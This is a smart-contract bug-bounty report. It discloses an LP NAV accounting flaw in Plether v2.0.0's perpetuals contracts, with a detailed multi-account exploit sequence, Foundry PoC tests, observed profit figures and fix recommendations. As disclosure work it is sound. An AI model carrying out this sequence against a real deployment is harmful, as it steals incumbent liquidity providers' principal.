# \#97717 [SC-Critical] Incorrect LP NAV accounting for reversible VPI enables repeatable theft of incumbent LP principal

**Submitted on Nov 2nd 2026 at 19:50:22 UTC by @sl1de for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97717
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Summary

Plether v2.0.0 prices Junior LP deposits and redemptions from HousePool physical assets plus terminal price PnL, but it does not preserve ownership of reversible lifetime virtual price impact (“VPI”) when the LP ownership set changes at an epoch boundary.

This creates two mirror accounting errors:

1. **Positive lifetime VPI is immediately recognized as redeemable LP revenue even though the same trader can later close and reclaim that VPI as a rebate.** An LP can mature a redemption, create positive VPI immediately before epoch settlement, redeem against the temporarily inflated Junior NAV, and leave the remaining LPs responsible for the subsequent rebate.

2. **Negative lifetime VPI is paid out by HousePool and locked one-for-one in a protected Clearinghouse reserve, but that fully funded pool receivable is omitted from LP entry NAV.** A pending depositor can therefore activate shares at a depressed price, close the position so the reserve returns to HousePool, and capture value belonging to the pre-entry LP cohort.

The two accounting errors compose into one permissionless cycle. The attacker:

1. starts as a Junior LP;
2. creates positive VPI immediately before redeeming;
3. reuses that redemption as a pending Junior deposit;
4. uses a second trader account to create an equal negative-VPI reserve immediately before deposit activation;
5. activates discounted shares;
6. closes the second position so the newly activated shares participate in the reserve recovery;
7. redeems those shares; and
8. closes the first position to reclaim its positive lifetime VPI.

The normal-price PoC uses the production V3 `commitOrder(OrderV3Types.OrderRequest)` and `executeOrder` path, permissionless `settleLpEpoch`, the normal deposit cooldown, and the normal asynchronous deposit/redemption lifecycle.

It does not require:

- an administrator or privileged role;
- a forged oracle value;
- a price change;
- a cap-price edge;
- an honest trader supplying pre-existing skew;
- a callback or reentrancy;
- a test-only accounting entry point; or
- any production source modification.

At an unchanged `$1` mark and the released v2.0.0 risk parameters, the complete cycle produced:

| Quantity | Observed result |
| --- | ---: |
| Positive lifetime VPI on the first position | 1,598.401598 USDG |
| Negative-VPI reserve on the opposite position | 3,191.066261 USDG |
| First redemption | 1,000,798.792531 USDG |
| Second redemption | 1,002,396.065627 USDG |
| Attacker profit after execution fees and elapsed carry | 1,109.086200 USDG |
| Incumbent LP principal loss | 2,069.086199 USDG |
| Protocol treasury increase | 960.000000 USDG |

The attacker ends with both positions closed and all attacker LP shares redeemed. The first redemption is reused for the second deposit rather than minting replacement LP capital.

The wealth comparison includes:

- the attacker LP wallet;
- both attacker trader wallets;
- all relevant Clearinghouse balances;
- both trader claim balances;
- any attacker LP-share value;
- incumbent Senior and Junior LP value; and
- protocol treasury balances.

The observed incumbent loss equals attacker profit plus the treasury increase within one six-decimal USDG atom.

The demonstrated impact is therefore **direct theft of incumbent LP principal**.

## Affected version and asset

The finding was reproduced against the competition’s frozen Plether v2.0.0 source:

```text
a82d4fefb02768e5b3bddcc97dee371eee24fea8
```

Affected in-scope source is under:

```text
packages/perps/src
```

The accounting path principally crosses:

- `packages/perps/src/CfdEngineSettlementSidecar.sol`
- `packages/perps/src/MarginClearinghouse.sol`
- `packages/perps/src/CfdEngineProtocolLens.sol`
- `packages/perps/src/TerminalNavBookV2.sol`
- `packages/perps/src/libraries/HousePoolAccountingLib.sol`
- `packages/perps/src/libraries/CloseAccountingLib.sol`
- `packages/perps/src/HousePool.sol`
- `packages/perps/src/TrancheVault.sol`

I am claiming the frozen v2.0.0 competition version as affected. I have not identified a released fixed version.

## Background and required ownership invariant

For absolute market skew `S`, economic pool depth `D`, and VPI factor `k`, Plether uses the potential:

```text
C(S) = k * S² / (2D)
```

A trade pays the change in this potential:

```text
VPI = C(S_post) - C(S_pre)
```

Increasing absolute skew produces positive VPI paid to HousePool. Reducing absolute skew produces negative VPI paid to the trader.

At the released `k = 1%` and maximum skew `S = 40% * D`, the potential is:

```text
0.01 * 0.4² / 2 = 0.0008D
```

This is eight basis points of pool depth.

VPI is also stored over each position’s lifetime. When a position closes, `CloseAccountingLib` calculates a fresh VPI delta but clamps the result so allocated lifetime VPI cannot finish negative. Consequently:

- a position that previously paid positive lifetime VPI may later receive a corresponding rebate; and
- a position that previously received negative lifetime VPI must return its backed reserve on close or liquidation.

Junior LP entry and exit are asynchronous. Deposit assets remain in vault escrow until their epoch activates, while redemption shares remain in escrow until a later epoch prices and burns them. `HousePool.settleLpEpoch` reconciles terminal equity before changing the LP ownership set.

The necessary ownership invariant is:

> Value that remains refundable to an open trader, and value already held as a deterministic reserve recovery for existing LPs, must not change LP owners merely because a deposit or redemption settles between the two VPI actions.

The implementation does not preserve this invariant.

## Positive path: refundable VPI is immediately made redeemable

A skew-increasing open produces positive VPI. In `CfdEngineSettlementSidecar.executeOpen`, the non-treasury inflow is immediately recorded as HousePool claimant revenue with cash already arrived:

```solidity
// packages/perps/src/CfdEngineSettlementSidecar.sol:454-463
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets =
        uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;

    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool()).recordClaimantInflow(
            poolCashInflowAssets,
            IHousePool.ClaimantInflowKind.Revenue,
            IHousePool.ClaimantInflowCashMode.CashArrived
        );
    }
}
```

`HousePool.settleLpEpoch` reconciles this revenue before freezing Junior principal and supply for redemption pricing:

```solidity
// packages/perps/src/HousePool.sol:835-843
_reconcile(accountingSnapshot, statusSnapshot);
_checkpointEngineCarryIndexes();

result.cutoffEpoch = cutoffEpoch;
RedemptionPhase memory juniorPhase;
juniorPhase.pricingPrincipal = juniorPrincipal;
juniorPhase.pricingSupply = _juniorShareSupply();
```

The reconciliation distributes the surplus into Junior principal. A matured redemption therefore receives its share of the positive VPI even though the position still stores positive `vpiAccrued` and retains the right to receive a later rebate.

Requesting redemption does not price or burn the shares. `TrancheVault.requestRedeem` transfers them into vault escrow:

```solidity
// packages/perps/src/TrancheVault.sol:606-630
_transfer(owner, address(this), shares);
requestId = _enqueueRedeemRequest(shares, controller);
```

The shares remain part of accrued supply until the epoch is funded. An attacker can therefore:

1. mature a redemption request;
2. create positive VPI immediately before permissionless settlement;
3. receive a redemption containing part of that temporary VPI revenue; and
4. close the position afterward and reclaim the VPI.

The remaining LP cohort funds the rebate after the attacker has already crystallized its share of the same value.

## Negative path: a fully funded pool receivable is omitted from entry NAV

For a skew-reducing open, HousePool first pays the gross rebate to Clearinghouse:

```solidity
// packages/perps/src/CfdEngineSettlementSidecar.sol:442-445
if (delta.poolRebatePayoutAssets > 0) {
    IHousePool(host.pool()).payOut(
        host.clearinghouse(),
        delta.poolRebatePayoutAssets
    );
}
```

The sidecar then locks the exact required negative-lifetime-VPI backing:

```solidity
// packages/perps/src/CfdEngineSettlementSidecar.sol:465-477
if (
    delta.vpiRebateReserveAfterAssets
        > delta.vpiRebateReserveBeforeAssets
) {
    uint256 reserveIncreaseAssets =
        delta.vpiRebateReserveAfterAssets
            - delta.vpiRebateReserveBeforeAssets;

    uint256 reserveFromFreeAssets =
        reserveIncreaseAssets
            - delta.vpiRebateReserveFromPledgeAssets;

    if (reserveFromFreeAssets > 0) {
        clearinghouse.lockVpiRebateReserve(
            delta.account,
            reserveFromFreeAssets
        );
    }
}
```

`MarginClearinghouse.lockVpiRebateReserve` moves this amount into protected reserved settlement and records it in the dedicated VPI sub-ledger:

```solidity
// packages/perps/src/MarginClearinghouse.sol:841-852
function lockVpiRebateReserve(
    address account,
    uint256 amountAssets
) external onlyOperator {
    if (amountAssets == 0) {
        return;
    }

    _lockMargin(
        account,
        IMarginClearinghouse.MarginBucket.ReservedSettlement,
        amountAssets
    );

    vpiRebateReserveBalances[account] += amountAssets;
}
```

The trader cannot withdraw this reserve or use it for unrelated action charges. It is fully funded cash that lifetime-VPI accounting requires to be returned to HousePool.

However, `CfdEngineProtocolLens.getHousePoolInputSnapshot` exports physical HousePool assets, terminal price PnL, maximum directional price liability, supplemental settlement reserves, and trader claims—but not the dedicated VPI reserve:

```solidity
// packages/perps/src/CfdEngineProtocolLens.sol:62-73
snapshot.physicalAssets = poolAssets;
snapshot.netPhysicalAssets = poolAssets;
snapshot.maxLiabilityAssets =
    terminalSnapshot.maxDirectionalLiabilityAssets;
snapshot.supplementalReservedAssets = ...;
snapshot.terminalLpPriceDeltaAssets =
    terminalSnapshot.terminalLpPriceDeltaAssets;
snapshot.traderClaimBalanceAssets =
    terminalSnapshot.totalTraderClaimsAssets;
```

`TerminalNavBookV2.terminalNavSnapshot` similarly exports terminal price PnL, claims, and maximum directional price liability, but no VPI-reserve receivable.

`HousePoolAccountingLib.buildReconcileSnapshot` therefore prices LP equity using physical assets minus claims plus signed terminal price PnL:

```solidity
// packages/perps/src/libraries/HousePoolAccountingLib.sol:60-77
uint256 terminalAssets = engineSnapshot.physicalAssets;
uint256 terminalLiabilities =
    engineSnapshot.traderClaimBalanceAssets;
int256 terminalDelta =
    engineSnapshot.terminalLpPriceDeltaAssets;

if (terminalDelta >= 0) {
    terminalAssets += uint256(terminalDelta);
} else {
    terminalLiabilities +=
        uint256(-(terminalDelta + 1)) + 1;
}
```

Because the gross rebate physically left HousePool, reconciliation marks down Junior principal. However, the exact amount is already held in protected Clearinghouse custody and is deterministically owed back to the pool.

A pending deposit settling in this state receives too many shares:

```solidity
// packages/perps/src/HousePool.sol:914-920
DepositPhase memory juniorDepositPhase;
juniorDepositPhase.pricingAssets = juniorPrincipal;
juniorDepositPhase.pricingSupply = _juniorShareSupply();

juniorDepositPhase = _settleDepositPhase(
    juniorVault,
    result.cutoffEpoch,
    juniorDepositPhase,
    0,
    false
);
```

The protocol therefore sells part of the pre-entry LP cohort’s funded recovery to the incoming depositor.

## How the reserve returns after LP ownership changes

On close, `CloseAccountingLib` calculates fresh VPI, but replaces it with the full opposite lifetime accrual when the raw result would leave lifetime VPI negative:

```solidity
// packages/perps/src/libraries/CloseAccountingLib.sol:103-118
state.proportionalAccrualAssets =
    (inputs.position.vpiAccrued * int256(inputs.sizeDelta))
        / int256(inputs.position.size);

state.vpiDeltaAssets = CfdMath.calculateVPI(
    inputs.preSkewAssets,
    inputs.postSkewAssets,
    inputs.poolDepthAssets,
    inputs.vpiFactor
);

if (
    state.proportionalAccrualAssets
        + state.vpiDeltaAssets
        < 0
) {
    state.vpiDeltaAssets =
        -state.proportionalAccrualAssets;
}
```

`MarginClearinghouse.consumeVpiRebateReserve` then transfers the reserved cash back to HousePool:

```solidity
// packages/perps/src/MarginClearinghouse.sol:883-906
vpiRebateReserveBalances[account] -= amountAssets;
reservedSettlementAssets[account] -= amountAssets;
settlementBalances[account] -= amountAssets;
IERC20(settlementAsset).safeTransfer(recipient, amountAssets);
```

The reserve funding is working correctly. The vulnerability is that the protocol does not preserve who owns the recovery while the reserve is outstanding.

A newly activated LP can buy the recovery at a discount immediately before an attacker-controlled close returns it.

## Complete attacker-controlled sequence

The Engine prevents one account from opening an opposing position, so the attacker uses two ordinary trader accounts and one LP account. No access-control bypass is required.

1. The attacker supplies Junior liquidity and waits through the normal deposit cooldown.
2. The attacker requests redemption of all Junior shares and lets that request mature.
3. Trader account A opens a maximum-skew SHORT at the normal `$1` mark.
4. The SHORT pays positive lifetime VPI to HousePool.
5. The attacker calls permissionless `settleLpEpoch`.
6. Reconciliation treats the positive VPI as current Junior revenue, and the mature redemption is funded at the inflated NAV.
7. The attacker claims the redemption.
8. Without minting replacement LP capital, the attacker uses those exact redeemed assets to request a new Junior deposit.
9. The deposit request matures.
10. Trader account B opens an equal LONG. This heals the SHORT skew, receives negative VPI, and locks the exact negative lifetime VPI in protected Clearinghouse reserve.
11. HousePool physical assets are lower by the gross rebate, while LP pricing omits the matching funded receivable.
12. The attacker calls permissionless `settleLpEpoch`.
13. The pending deposit activates at the depressed Junior NAV and mints more shares than the pre-reserve quote.
14. Trader account B closes the LONG.
15. The lifetime clamp consumes and returns the full VPI reserve to HousePool. The newly activated shares participate in that recovery.
16. After the normal cooldown, the attacker requests and claims redemption of all newly activated shares.
17. Trader account A closes the original SHORT and reclaims its positive lifetime VPI.
18. Both positions are zero and all attacker LP shares have been redeemed.

The attacker returns to a flat state and can repeat the sequence after another LP lifecycle.

## Observed value transfer

The complete normal-price test begins with approximately:

- `1,002,000 USDG` of incumbent LP capital;
- `1,000,000 USDG` of attacker Junior capital; and
- `100,000 USDG` in each attacker trader account.

Observed results were:

```text
positive lifetime VPI:       1,598.401598 USDG
negative-VPI reserve:        3,191.066261 USDG
first redemption:        1,000,798.792531 USDG
second redemption:       1,002,396.065627 USDG
attacker profit:              1,109.086200 USDG
incumbent LP loss:            2,069.086199 USDG
treasury increase:              960.000000 USDG
```

The attacker bears four `320 USDG` execution fees. Three are cash-credited to the treasury. The final rebate-close fee is withheld from the rebate and remains in HousePool, so treasury cash increases by `960 USDG` while the attacker’s wealth calculation still includes all four fees.

Approximately `6.98 USDG` of elapsed carry is also included.

The PoC asserts:

```solidity
assertApproxEqAbs(
    incumbentLoss,
    attackerProfit + treasuryGain,
    5,
    "attacker profit plus explicit fees must equal incumbent ownership loss"
);
```

This rules out the result being only a display or share-accounting artifact. Real incumbent LP principal decreases while attacker wealth increases.

## Why this is not public finding #30

Public finding #30 concerns temporary liquidity increasing pool depth and reducing a fresh skew-increasing close charge.

The standalone LP-entry control deliberately adds `3,000,000 USDG` of LP depth after the negative-VPI reserve is created. It observes:

```text
negative-VPI reserve:                    797.766729 USDG
raw fresh close VPI after added depth:   199.899968 USDG
attacker net wealth gain:                278.161581 USDG
incumbent Junior principal loss:         598.179860 USDG
```

The added depth makes raw close VPI approximately four times smaller than the reserve. Nevertheless, the lifetime clamp consumes and returns the entire `797.766729 USDG` reserve.

The attacker profits because discounted LP shares capture a funded pre-entry recovery, not because the close charge is undercomputed.

A depth snapshot, opening-depth rule, or TWAP fix for public finding #30 would not prevent the discounted share mint.

## Why this is not public finding #31

Public finding #31 concerns reducing pool liquidity to magnify a fresh skew-reducing close rebate.

The standalone redemption control introduces an unrelated incoming LP whose deposit replaces the funded redemption before the attacker closes. It observes:

```text
restored close depth:     2,003,598.401598 USDG
opening VPI:                  1,598.401598 USDG
closing VPI:                  1,597.126448 USDG
attacker profit:                157.517127 USDG
```

The closing VPI is smaller than the opening VPI, rather than amplified, yet the attack remains profitable.

An opening-depth or TWAP fix for public finding #31 therefore does not fix the ownership transfer.

The composed attack’s second rebate is larger because the preceding redemption reduces depth. That amplification is not the novelty claim. The standalone added-depth and restored-depth controls establish the independent ownership bug; the composed test establishes that one attacker can exploit both sides without relying on an honest skew trader.

## Why intentional VPI exclusion does not resolve the issue

The documentation intentionally excludes action reserves from the terminal price-risk curve. This report is not claiming that every action reserve should be counted as withdrawable HousePool cash or directional price PnL.

The issue is temporal ownership:

- carry may be uncollected trader debt, and the accounting specification explicitly assigns some historical carry by collection time;
- the negative-VPI reserve is already funded, protected, and nonwithdrawable;
- the lifetime clamp makes its return deterministic while the position obligation remains;
- the attacker controls when that exact reserve returns; and
- `MarginClearinghouse` describes reserve consumption as returning negative-VPI backing to the LP pool.

The current implementation lets an incoming LP buy this recovery after it is funded but before it is returned. The mirror positive-VPI path lets an exiting LP redeem cash while the originating trader’s rebate right remains live.

Thus the issue is not merely that VPI is excluded from the price-risk cap. The issue is that reversible VPI changes LP owners across an epoch boundary.

## Exploit prerequisites and practical constraints

The normal-price exploit requires:

- permissionless access to the normal Router and LP vaults;
- sufficient attacker Junior liquidity;
- two attacker-controlled trader accounts;
- sufficient trader margin;
- completed asynchronous LP epochs and the normal deposit cooldown; and
- execution at an acceptable authenticated mark.

The runtime PoC uses an approximately `1:1` attacker-to-incumbent LP capital ratio and remains profitable.

Parameter analysis indicates that a near-optimal released-parameter cycle uses an attacker Junior fraction of approximately `59.75%`, corresponding to attacker/victim LP capital of approximately `1.484:1`.

The capital cannot be flash-borrowed for a single transaction because deposit activation, redemption maturity, and cooldown span multiple blocks and hours. The original skew position remains exposed to price movement during the LP lifecycle. Target-price predicates can prevent execution at an unacceptable mark, and an external hedge may reduce exposure, but price movement and financing costs are genuine practical constraints.

At the ordinary `$1` mark, extraction is gradual rather than a one-transaction total pool wipe. The sequence nevertheless returns the attacker to no open position and no LP shares, making repeated cycles possible.

A separate cap-price test leaves only `0.818508 USDG` of `2,000 USDG` incumbent capital, a `99.96%` loss. That variant requires approximately `3,123,000 USDG` of attacker LP capital against `2,000 USDG` of incumbent capital and a cap-price market state. I present it only as an impact amplifier, not as the basis for validity or severity.

## Severity rationale

The narrow demonstrated impact is an unprivileged, deterministic transfer of incumbent LP principal to an attacker.

The normal-price test:

- uses the public production-shaped Router lifecycle;
- requires no administrative permission;
- uses an unchanged authenticated mark;
- includes all execution fees and elapsed carry;
- includes every attacker-controlled account in the before/after wealth calculation;
- ends with both positions closed and all attacker LP shares redeemed; and
- demonstrates a matching decline in incumbent LP ownership.

This corresponds directly to the selected in-scope impact:

> Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield.

The asynchronous lifecycle, capital requirement, and price exposure affect feasibility and extraction rate. They do not change the asset being stolen or the attacker’s lack of privilege.

## Recommended remediation

VPI ownership must remain attached to the LP cohort that economically owns it until the corresponding position obligation is extinguished.

For negative lifetime VPI:

1. Maintain an aggregate of dedicated negative-VPI reserves attributable to HousePool.
2. Include that aggregate as a non-cash LP receivable in both deposit and redemption pricing NAV.
3. Do not include this receivable in immediately withdrawable free cash.
4. When close or liquidation consumes a reserve, reduce the non-cash receivable by the same amount that physical HousePool cash increases.
5. Ensure the cash/receivable substitution does not cause an LP NAV jump.

For positive lifetime VPI:

1. Do not immediately expose the refundable portion of collected VPI as unencumbered redeemable Junior principal.
2. Track it in a deferred-revenue or quarantined-value bucket, or subtract a conservative positive-lifetime-VPI refund exposure from LP pricing and withdrawal availability.
3. Release it to LP revenue only when close, position reduction, or liquidation makes that amount irreversible.
4. Handle partial closes, position increases, waived rebates, signed rounding, and liquidation exactly once.

The fix must apply symmetrically to deposit activation and redemption funding. Correcting only the NAV numerator may overfund exits if physical withdrawal availability is not also constrained; reserving cash without correcting the NAV numerator still transfers ownership.

Address-based restrictions are ineffective because the LP and trader roles can be separated across attacker-controlled accounts.

Recommended regression coverage includes:

1. the complete two-trader cycle, asserting no attacker wealth increase and no incumbent principal transfer;
2. negative-VPI reserve ownership across deposit activation where raw fresh close VPI is below the reserve;
3. positive lifetime VPI across a mature redemption;
4. exact restored-depth and added-depth controls independent of public findings #30 and #31;
5. repeated flat-to-flat cycles;
6. partial close, increase, liquidation, oracle-frozen close, waived rebate, and both tranche waterfall states; and
7. an invariant that reserve consumption replaces the non-cash receivable with physical cash without changing LP ownership value.

## Proof of Concept

## Runnable PoC archive

The complete Foundry PoC package is available here:

[Download plether-vpi-ownership-poc-a82d4fe.zip](https://drive.google.com/file/d/1oibXFJALL6kUnYCghIAIw9FyJ54taRBU/view?usp=sharing)

SHA-256:

```text
464544ea6fb75c6878eda54a501381ef15bbd99ead88cd1526b028d7afb2960c
```

The archive contains all three PoC files at their correct repository-relative paths. The link was verified to permit unauthenticated downloads, and the downloaded archive matched the SHA-256 above.

## PoC overview

The PoC consists of three Foundry test files:

```text
packages/perps/test/perps/accounting/close/VpiLpCombinedOwnership.t.sol
packages/perps/test/perps/accounting/close/VpiLpEntryOwnership.t.sol
packages/perps/test/perps/accounting/close/VpiLpRedemptionOwnership.t.sol
```

Extract the archive at the frozen competition repository root. The files will be placed at the correct paths automatically.

The tests modify no production contract. They inherit the repository’s existing `BasePerpTest` fixture, which deploys the in-scope Engine, planner, settlement sidecar, Clearinghouse, HousePool, both tranche vaults, `TerminalNavBookV2`, policy evaluator, oracle integration, lifecycle book, and Router logic.

All attack orders use the struct-typed V3 public interface:

```solidity
router.commitOrder(OrderV3Types.OrderRequest);
router.executeOrder(orderId, updateData);
```

LP epochs are settled through the permissionless Router function:

```solidity
router.settleLpEpoch(updateData);
```

The fixture’s local Pyth update data and test USDG minting replace external infrastructure only. They do not bypass the affected accounting, LP lifecycle, cooldown, delayed-order lifecycle, margin checks, reserve locking, liability checks, or settlement code.

## Environment and execution

Use the frozen competition source:

```text
a82d4fefb02768e5b3bddcc97dee371eee24fea8
```

From the repository root:

```sh
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
unzip plether-vpi-ownership-poc-a82d4fe.zip
cd packages/perps
```

Run all exploit and control tests together:

```sh
forge test \
  --match-path 'test/perps/accounting/close/VpiLp*Ownership.t.sol' \
  -vv
```

They can also be run individually:

```sh
forge test \
  --match-path test/perps/accounting/close/VpiLpCombinedOwnership.t.sol \
  -vv

forge test \
  --match-path test/perps/accounting/close/VpiLpEntryOwnership.t.sol \
  -vv

forge test \
  --match-path test/perps/accounting/close/VpiLpRedemptionOwnership.t.sol \
  -vv
```

The tests use the released risk parameters:

```text
VPI factor:                  1%
maximum skew ratio:         40%
maintenance margin:         10 bps
initial margin:             20 bps
FAD margin:                300 bps
base carry:                500 bps
execution fee:               4 bps of notional
settlement buffer:          25 bps of maximum liability
primary-test mark price:     $1
```

## Primary reproduction: complete attacker-controlled cycle

Run:

```sh
forge test \
  --match-path test/perps/accounting/close/VpiLpCombinedOwnership.t.sol \
  -vv
```

The relevant test is:

```text
test_PoC_AttackerComposesBothVpiOwnershipErrorsWithoutPreexistingSkew
```

### Initial state

The test creates three attacker-controlled roles:

```text
ATTACKER_LP   - owns Junior LP shares
SKEW_TRADER  - opens the positive-lifetime-VPI SHORT
HEAL_TRADER  - opens the negative-lifetime-VPI LONG
```

It supplies:

```text
attacker Junior liquidity:       1,000,000 USDG
SKEW_TRADER capital:               100,000 USDG
HEAL_TRADER capital:               100,000 USDG
position size per trader:          800,000 tokens
position margin per trader:         20,000 USDG
unchanged mark price:                    $1
```

The fixture begins with approximately `1,002,000 USDG` of incumbent Senior and Junior LP value.

Before the attack, the test records:

- attacker LP wallet assets;
- both attacker trader wallets;
- all attacker Clearinghouse balances;
- both trader claim balances;
- the asset value of any attacker Junior shares;
- incumbent Senior and Junior LP value; and
- the protocol treasury balance.

This prevents profit from being created by omitting an attacker-controlled account, claim, share balance, or fee recipient.

### Step 1: mature the first redemption

The attacker waits through the normal cooldown, requests redemption of every attacker-owned Junior share, and advances to the redemption epoch:

```solidity
vm.warp(
    juniorVault.lastDepositTime(ATTACKER_LP)
        + juniorVault.DEPOSIT_COOLDOWN()
);

uint256 firstRedeemId = juniorVault.requestRedeem(
    firstShares,
    ATTACKER_LP,
    ATTACKER_LP
);

vm.warp(pool.lpEpochStart(firstRedeemId));
```

The redemption is now mature but has not yet been priced or funded.

### Step 2: create refundable positive VPI before settlement

`SKEW_TRADER` opens a maximum-skew SHORT through the delayed-order Router at the unchanged `$1` mark:

```solidity
_executePublicOrder(
    SKEW_TRADER,
    bytes32("combined-skew-open"),
    CfdTypes.Side.SHORT,
    POSITION_SIZE,
    POSITION_MARGIN,
    false
);
```

The test verifies:

- the V3 order executed;
- the expected position size was installed; and
- the position’s lifetime VPI is positive.

Observed positive lifetime VPI:

```text
1,598.401598 USDG
```

HousePool recognizes this as current revenue even though the position remains open and can later reclaim VPI on close.

### Step 3: settle and claim the inflated redemption

The attacker calls:

```solidity
router.settleLpEpoch(updateData);
```

Reconciliation recognizes the positive VPI before pricing the mature redemption. The test verifies that every requested share is funded and claims the redemption.

Observed first redemption:

```text
1,000,798.792531 USDG
```

This exceeds the attacker’s initial `1,000,000 USDG` Junior deposit because the redemption crystallizes part of the refundable VPI.

### Step 4: reuse the redemption for a pending deposit

The test does not mint replacement LP capital. It approves and deposits the exact redemption:

```solidity
settlementToken.approve(
    address(juniorVault),
    firstRedemption
);

uint256 depositId = juniorVault.requestDeposit(
    firstRedemption,
    ATTACKER_LP,
    ATTACKER_LP
);
```

The deposit request matures, and the test records the fair share quote before creating the negative-VPI reserve:

```solidity
vm.warp(juniorVault.depositEpochStart(depositId));

uint256 fairSharesBeforeReserve =
    juniorVault.estimateDepositShares(firstRedemption);
```

### Step 5: create a fully funded negative-VPI reserve

The second trader account opens an equal LONG:

```solidity
_executePublicOrder(
    HEAL_TRADER,
    bytes32("combined-heal-open"),
    CfdTypes.Side.LONG,
    POSITION_SIZE,
    POSITION_MARGIN,
    false
);
```

This heals the existing SHORT skew and receives negative VPI.

The test computes the exact negative lifetime VPI and verifies one-for-one reserve backing:

```solidity
uint256 rebateReserve =
    uint256(-(negativeLifetimeVpi + 1)) + 1;

assertEq(
    clearinghouse.vpiRebateReserveAssets(HEAL_TRADER),
    rebateReserve,
    "negative VPI must be exactly reserved"
);
```

Observed reserve:

```text
3,191.066261 USDG
```

HousePool has paid this gross rebate, but the exact amount is locked in protected Clearinghouse reserve.

The test verifies that the pending deposit’s share quote increases after the reserve is created:

```solidity
assertGt(
    juniorVault.estimateDepositShares(firstRedemption),
    fairSharesBeforeReserve,
    "omitted reserve must discount the second LP entry"
);
```

The reserve is fully funded, but entry NAV treats its value as if it had permanently left the LP cohort.

### Step 6: activate the discounted shares

The attacker calls `settleLpEpoch`, claims the deposit, and verifies that the share amount exceeds the pre-reserve quote:

```solidity
uint256 secondShares = juniorVault.claimDeposit(
    depositId,
    firstRedemption,
    ATTACKER_LP,
    ATTACKER_LP
);

assertGt(
    secondShares,
    fairSharesBeforeReserve,
    "second entry must mint reserve-discounted shares"
);
```

### Step 7: return the reserve after the attacker owns the shares

`HEAL_TRADER` closes its LONG through the same delayed-order path:

```solidity
_executePublicOrder(
    HEAL_TRADER,
    bytes32("combined-heal-close"),
    CfdTypes.Side.LONG,
    POSITION_SIZE,
    0,
    true
);
```

The lifetime clamp forces negative lifetime VPI back to zero and returns the protected reserve to HousePool.

The test verifies:

```solidity
assertEq(
    clearinghouse.vpiRebateReserveAssets(HEAL_TRADER),
    0,
    "healing close must return the full reserve"
);
```

Because the discounted shares are already active, they participate in the reserve recovery.

### Step 8: redeem all second-cycle shares

The attacker waits through the normal deposit cooldown, requests redemption of all newly activated shares, advances to the epoch, and settles it.

The test verifies that the complete redemption remains serviceable while the original SHORT is still open:

```solidity
assertEq(
    juniorVault.claimableRedeemRequest(
        secondRedeemId,
        ATTACKER_LP
    ),
    secondShares,
    "second redemption must remain serviceable with the skew leg open"
);
```

Observed second redemption:

```text
1,002,396.065627 USDG
```

### Step 9: close the original position

`SKEW_TRADER` closes the original SHORT:

```solidity
_executePublicOrder(
    SKEW_TRADER,
    bytes32("combined-skew-close"),
    CfdTypes.Side.SHORT,
    POSITION_SIZE,
    0,
    true
);
```

The original positive lifetime VPI is reclaimed as permitted by the close accounting. The test verifies that both attacker positions are now zero.

### Step 10: verify the wealth transfer

The test recomputes attacker wealth and incumbent LP ownership using the same components as the initial snapshot.

It asserts:

```solidity
assertGt(
    attackerProfit,
    1000e6,
    "composed public lifecycle must extract material incumbent principal"
);

assertLt(
    afterAttack.incumbentLpAssets,
    beforeAttack.incumbentLpAssets,
    "incumbent LPs must fund the attack"
);

assertApproxEqAbs(
    incumbentLoss,
    attackerProfit + treasuryGain,
    5,
    "attacker profit plus explicit fees must equal incumbent ownership loss"
);
```

Observed output:

```text
[PASS] test_PoC_AttackerComposesBothVpiOwnershipErrorsWithoutPreexistingSkew()

combined positive lifetime VPI: 1598.401598
combined negative VPI reserve: 3191.066261
first inflated redemption: 1000798.792531
second inflated redemption: 1002396.065627
combined attacker profit: 1109.086200
combined incumbent LP loss: 2069.086199
combined protocol fees: 960.000000
```

At completion:

- attacker profit is `1,109.086200 USDG`;
- incumbent LP ownership has lost `2,069.086199 USDG`;
- the treasury has gained `960 USDG`;
- both attacker positions are closed; and
- the attacker has redeemed all LP shares.

The conservation assertion matches incumbent loss to attacker profit plus treasury gain within five six-decimal USDG atoms; the observed difference is one atom.

## Standalone entry test and public finding #30 control

Run:

```sh
forge test \
  --match-path test/perps/accounting/close/VpiLpEntryOwnership.t.sol \
  -vv
```

The relevant test is:

```text
test_NegativeVpiReserveOmissionLetsLateJuniorLpCaptureIncumbentPrincipal
```

The test isolates the negative-VPI entry primitive:

1. An existing trader opens a live SHORT and creates real skew.
2. The attacker submits and matures a `3,000,000 USDG` Junior deposit.
3. The attacker opens an equal LONG immediately before settlement.
4. HousePool pays the gross negative VPI.
5. Clearinghouse locks the exact negative lifetime VPI in protected reserve.
6. Entry NAV falls because the reserve receivable is omitted.
7. The deposit activates and mints more shares than the pre-rebate quote.
8. The attacker closes the LONG.
9. The lifetime clamp returns the full reserve to HousePool.
10. After the normal cooldown, the attacker redeems all shares.
11. Before/after wealth accounting proves attacker gain and incumbent LP loss.

The important control computes raw fresh close VPI after the large attacker deposit increases pool depth:

```solidity
int256 rawFreshCloseVpi = CfdMath.calculateVPI(
    0,
    (TRADE_SIZE * MARK_PRICE) / 1e20,
    pool.totalAssets(),
    _riskParams().vpiFactor
);

assertLt(
    uint256(rawFreshCloseVpi),
    rebateReserveAssets,
    "added LP depth makes raw close VPI smaller than the reserve; public finding #30 is not the profit source"
);
```

Observed output:

```text
[PASS] test_NegativeVpiReserveOmissionLetsLateJuniorLpCaptureIncumbentPrincipal()

negative VPI reserve omitted from entry NAV: 797.766729
smaller raw close VPI after added LP depth: 199.899968
attacker discounted Junior shares: 3000027511799634
attacker redeemed assets: 3000598161889
attacker combined wealth gain: 278.161581
incumbent Junior principal loss: 598.179860
protocol execution fees: 320.000000
```

Raw fresh close VPI is only `199.899968 USDG`, while the protected reserve is `797.766729 USDG`.

The test then verifies that the close returns at least the full reserve:

```solidity
assertGe(
    pool.totalAssets() - poolAssetsBeforeClawback,
    rebateReserveAssets,
    "lifetime clamp must return the full reserve even though raw fresh VPI is smaller"
);
```

